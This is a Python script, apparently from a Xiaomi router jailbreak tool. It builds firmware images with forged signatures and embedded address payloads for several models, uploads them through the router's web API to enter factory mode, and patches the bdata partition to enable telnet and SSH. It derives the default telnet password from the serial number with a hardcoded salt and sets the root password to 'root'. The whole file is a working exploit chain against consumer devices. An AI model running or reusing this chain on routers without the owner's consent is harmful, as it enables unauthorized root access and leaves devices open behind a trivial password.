#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import types
import datetime
import platform
import ctypes
import hashlib
import binascii
import re

sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from xqimage import *
from gateway import *
from read_info import *
from envbuffer import *


gw = Gateway(timeout = 4)
if gw.status < 1:
  die("Xiaomi Mi Wi-Fi device not found (IP: {})".format(gw.ip_addr))

print("device_name =", gw.device_name)
print("rom_version = {} {}".format(gw.rom_version, gw.rom_channel))
print("MAC Address = {}".format(gw.mac_address))

dn = gw.device_name
gw.ssh_port = 22
if gw.ping(verbose = 0) is True:
  die(0, "Stock SSH server already installed and running")


class ExFlasher():
  gw = None
  devinf = None
  syslog = None

  def __init__(self, gw):
    self.gw = gw
    self.devinf = DevInfo(gw, verbose = 0, infolevel = 0)
    self.syslog = SysLog(gw, timeout = 17, verbose = 1, infolevel = 2)

  def build_sign(self, model):
    def i2b(value):
      return value.to_bytes(4, byteorder='little')
    model = model.upper()
    payload = None
    if model == "R3G":
      poffset = 0x1058
      payload = i2b(0x416078) + i2b(0) + i2b(0) + i2b(0x402810)
    if model == "RA69":
      poffset = 0x1070
      payload = i2b(0x4152A8) + i2b(0) + i2b(0x402634) + i2b(0)
    if model == "RA70":
      poffset = 0x1078
      payload = i2b(0x4152D0) + i2b(0) + i2b(0x40265C) + i2b(0)
    if model == "RA72":
      poffset = 0x1078
      payload = i2b(0x4152E0) + i2b(0) + i2b(0x402630) + i2b(0)
    if model == "R3600":
      poffset = 0x1070
      payload = i2b(0x415290) + i2b(0) + i2b(0x402634) + i2b(0)
    if model == "RB03":
      poffset = 0x1078
      payload = i2b(0x4148B0) + i2b(0) + i2b(0x40263C) + i2b(0)
    if not payload:
      die('Payload is not defined for device "{}".'.format(model))
    # add header of sign section (16 bytes)
    sign = i2b(poffset) + (b'\x00' * 12)
    # add fake sign 
    size = poffset - len(payload)
    for i in range(0, size, 4):
      sign += (0xEAA00000 + i).to_bytes(4, byteorder='little')
    # add payload
    sign += payload
    return sign
    
  def get_bdata_env(self, syslog = None, verbose = 1):
    syslog = syslog if syslog is not None else self.syslog
    syslog.verbose = verbose
    bdata = self.syslog.parse_bdata()
    if not bdata:
      if self.gw.device_name != 'R3G':
        die('File bdata.txt not found in syslog!')
      facinfo = self.gw.get_factory_info()
      bdata = EnvBuffer('SN={}\n'.format(syslog.device_sn), '\n')
      bdata.var['color'] = '101'
      bdata.var['CountryCode'] = 'CN'
      bdata.var['model'] = self.gw.device_name.upper()
      bdata.var['wl0_ssid'] = facinfo['wl0_ssid']
      bdata.var['wl1_ssid'] = facinfo['wl1_ssid']
    return bdata

  def create_hack_images(self):
    imgdict = {}
    dn = self.gw.device_name
    signature = self.build_sign(dn)
    bdata = self.get_bdata_env(verbose = 2)
    bdata.var['boot_wait'] = "on"
    bdata.var['uart_en'] = "1"
    bdata.var['telnet_en'] = "1"
    bdata.var['ssh_en'] = "1"
    #bdata.var['CountryCode'] = "EU"
    partname = 'bdata'
    bdata.mtd = self.syslog.get_mtd_by_name(partname)
    if not bdata.mtd:
      die('MTD partition "{}" not found!'.format(partname))
    bdata_env_size = 0x10000   # fixed size of BData environment buffer
    if dn == 'R3G':
      bdata_env_size = 0x4000
    bdata.buf = bdata.pack(bdata_env_size)
    bdata.buf += b'\xFF' * (bdata.mtd.size - len(bdata.buf))
    bdata.img = XQImage(self.gw.device_name)
    bdata.img.add_version(self.gw.rom_version)
    bdata.img.add_file(bdata.buf, 'bdata.bin', mtd = bdata.mtd.id)

    partname = 'crash'
    crash_mtd = self.syslog.get_mtd_by_name(partname)
    if not crash_mtd:
      die('MTD partition "{}" not found!'.format(partname))

    def create_crash_image(mtd, prefix, outfilename):
      crash = types.SimpleNamespace()
      crash.mtd = mtd
      if prefix is None:
        prefix = b''
      crash.buf = bytearray(prefix + b'\xFF' * (mtd.size - len(prefix)))
      crash.img = XQImage(self.gw.device_name)
      crash.img.add_version(self.gw.rom_version)
      crash.img.add_file(crash.buf, 'crash.bin', mtd = mtd.id)
      crash.img.save_image(signature, outfilename)
      print('Created hacked image file: "{}"'.format(outfilename))
      return crash

    # image for activate "factory mode" via uboot (insert factory_mode=1 into kernel cmdline)
    imgdict['crash1'] = 'outdir/image_{device}_1_crash.bin'.format(device = dn)
    crash1 = create_crash_image(crash_mtd, b'\xA5\x5A\x00\x00', imgdict['crash1'])

    # image for change BData environment
    imgdict['bdata'] = 'outdir/image_{device}_2_bdata.bin'.format(device = dn)
    bdata.img.save_image(signature, imgdict['bdata'])
    print('Created hacked image file: "{}"'.format(imgdict['bdata']))

    # image for deactivate "factory mode" via uboot
    imgdict['crash3'] = 'outdir/image_{device}_3_crash.bin'.format(device = dn)
    crash3 = create_crash_image(crash_mtd, None, imgdict['crash3'])

    # image for testing (debug)
    #fn_test = 'outdir/image_{device}_test.bin'.format(device = dn)
    #test = create_crash_image(crash_mtd, b'TEST_DEBUG', fn_test)
    return imgdict

  def upload_rom(self, filename, timeout=6):
    if not self.gw.stok:
      self.gw.web_login()
    print('Upload HDR1 image "{}" to device ...'.format(filename))
    ok = False
    try:
      res = requests.post(self.gw.apiurl + "xqsystem/upload_rom", files={"image":open(filename, 'rb')}, timeout=4)
      print('Response:', res.text)
    except requests.exceptions.Timeout as e:
      ok = True
      print('The hacked image has been successfully exploited. The device reboots...')
    if not self.gw.wait_shutdown(timeout):
      die('The hacked image "{}" did not trigger a reboot.'.format(filename))
    #print('Device not responding.')
    return True

  def wait_reboot(self, timeout):
    if not self.gw.wait_reboot(timeout):
      die('Device reboot timed out!!! (timeout = {} sec)'.format(timeout))

  def patch_bdata(self):
    if self.gw.rom_channel != 'release':
      die('Supported only "release" firmware for this device')
    imgdict = self.create_hack_images()
    reboot_timeout = 75

    # stage 1: enable factory mode
    facinfo = self.gw.get_factory_info()
    if facinfo['facmode'] is True:
      print('Factory mode already activated.')
    else:
      self.upload_rom(imgdict['crash1'])
      self.wait_reboot(reboot_timeout)
      facinfo = self.gw.get_factory_info()
      if not facinfo['facmode']:
        die('Failed to activate factory mode.')

    # stage 2: using factory mode for flashing Bdata
    self.upload_rom(imgdict['bdata'])
    self.wait_reboot(reboot_timeout)
    self.gw.status = -2
    slog = SysLog(self.gw, timeout = 12, verbose = 0, infolevel = 2)
    slog.verbose = 2
    bdata = slog.parse_bdata()
    if not bdata or not bdata.var:
      if self.gw.device_name != 'R3G':
        die('File bdata.txt not found in syslog!')
      bdata = EnvBuffer('telnet_en=1\n', '\n')  # hack only for R3G
    if not 'telnet_en' in bdata.var:
      die('Failed to patch Bdata partition.')
    if bdata.var['telnet_en'] != '1':
      die('Failed to patch Bdata partition!')

    # stage 3: disable factory mode
    self.upload_rom(imgdict['crash3'])
    self.wait_reboot(reboot_timeout)
    self.gw.web_login()
    return True


def calc_xqpassword(device_sn):
  guid = 'd44fb0960aa0-a5e6-4a30-250f-6d2df50a'   # finded into mkxqimage
  salt = '-'.join(reversed(guid.split('-')))
  password = hashlib.md5((device_sn + salt).encode('utf-8')).hexdigest()
  return password[:8]

def device_factory_reset(timeout = 17, format_user_data = False):
  try:
    params = { 'format': '1' if format_user_data else '0' }
    res = requests.post(gw.apiurl + "xqsystem/reset", params = params, timeout=timeout)
    if res.text.find('{"code":0}') < 0:
      die('Can\'t run Factory reset: ' + res.text)
    print('Factory Reset activated...')
    if not gw.wait_shutdown(timeout):
      die('Factory reset request did not trigger a reboot.')
  except Exception as e:
    die('Can\'t run Factory reset.')

def telnet_connect(xqpass):
  for i, psw in enumerate([xqpass, 'root']):
    gw.passw = psw
    tn = gw.get_telnet()
    if tn:
      return psw
  return None


flasher = ExFlasher(gw)
xqpass = calc_xqpassword(flasher.syslog.device_sn)
print('Default Telnet password: "{}"'.format(xqpass))

if not gw.check_telnet():
  bdata = flasher.get_bdata_env()
  if not 'telnet_en' in bdata.var or not bdata.var['telnet_en']:
    flasher.patch_bdata()

if not gw.check_telnet():
  die('The Telnet server could not be activated.')

'''
print('Connect to telnet ...')
if not telnet_connect(xqpass):
  print('Can\'t connect to Telnet server.')
  device_factory_reset()
  flasher.wait_reboot(75)
'''

print('Connect to Telnet ...')
if not telnet_connect(xqpass):
  die('Failed to authenticate on Telnet server.')

gw.use_ssh = False
gw.run_cmd('echo -e "root\\nroot" | passwd root')
time.sleep(1)
if not telnet_connect(xqpass):
  die('Failed to authenticate on Telnet server.')
#gw.run_cmd('(echo root; sleep 1; echo root) | passwd root')
gw.run_cmd('sed -i \'s/"$flg_ssh" != "1" -o "$channel" = "release"/-n ""/g\' /etc/init.d/dropbear')
gw.run_cmd("/etc/init.d/dropbear enable")
print('Run SSH server on port 22 ...')
gw.run_cmd("/etc/init.d/dropbear restart", timeout = 40)  # RSA host key generate very slow!
gw.run_cmd('logger -p err -t XMiR "completed!"')

gw.use_ssh = True
gw.passw = 'root'
gw.ping(contimeout = 32)   # RSA host key generate very slow!

print('#### SSH and Telnet services are activated! ####')

